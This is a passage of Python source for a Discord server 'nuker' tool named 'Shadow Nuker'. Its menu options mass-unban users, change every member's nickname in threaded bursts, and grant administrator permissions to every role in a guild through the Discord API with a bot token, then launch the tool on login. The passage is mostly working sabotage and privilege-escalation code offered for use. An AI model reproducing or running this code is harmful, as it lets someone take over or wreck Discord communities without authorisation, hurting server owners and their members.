            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Unbanned {len(self.banned)}/{len(bans)} users")
            time.sleep(1.5)
            self.menu()

        elif ans in ["15"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            user_id = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) User ID\x1b[38;5;51m:\x1b[0m ")
            self.banned.clear()
            self.execute_unban(guild, user_id, token)
            time.sleep(1.5)
            self.menu()

        elif ans in ["16"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            nickname = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) New Nickname\x1b[38;5;51m:\x1b[0m ")
            self.members = []
            members = [str(member.id) for member in guild.members]
            if not members:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No members found in the guild")
                time.sleep(1.5)
                self.menu()
            for member_id in members:
                t = threading.Thread(target=self.execute_mass_nick, args=(guild, member_id, nickname, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Changed nicknames for {len(self.members)}/{len(members)} members")
            time.sleep(1.5)
            self.menu()

        elif ans in ["17"]:
            guild = __client__.get_guild(int(guildid))
            if not guild:
                print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid guild ID")
                time.sleep(1.5)
                self.menu()
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v10/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            if not roles:
                print("\x1b[0m(\x1b[31m-\x1b[0m) No roles found in the guild")
                time.sleep(1.5)
                self.menu()
            for role in roles:
                t = threading.Thread(target=self.execute_grant_admin, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Granted admin to {len(self.roles)}/{len(roles)} roles")
            time.sleep(1.5)
            self.menu()

        elif ans in ["18"]:
            print("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Thanks for using Shadow!")
            time.sleep(1.5)
            os._exit(0)

        else:
            print("\x1b[0m(\x1b[31m-\x1b[0m) Invalid option, please choose 01-18")
            time.sleep(1.5)
            self.menu()

@__client__.event
async def on_ready():
    try:
        await __client__.change_presence(status=discord.Status.online, activity=discord.Game(name="Shadow Nuker"))
        print(f"\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Authenticated as\x1b[38;5;51m: \x1b[0m{__client__.user.name}#{__client__.user.discriminator}")
        time.sleep(1.5)
        Shadow().menu()
    except Exception as e:
        print(f"\x1b[0m(\x1b[31m-\x1b[0m) Error setting status: {str(e)}")
        time.sleep(1.5)
        Shadow().menu()

if __name__ == "__main__":
    try:
        os.system("title Shadow Nuker ^| Authentication & mode con: cols=95 lines=25") if os.name == "nt" else os.system("clear")
        guildid = input("\x1b[0m(\x1b[38;5;51mShadow\x1b[0m) Guild ID\x1b[38;5;51m:\x1b[0m ")
        __client__.run(token, bot=True)
    except Exception as e:
        print(f"\x1b[0m(\x1b[31m-\x1b[0m) {str(e)}")
        time.sleep(1.5)
        os._exit(0)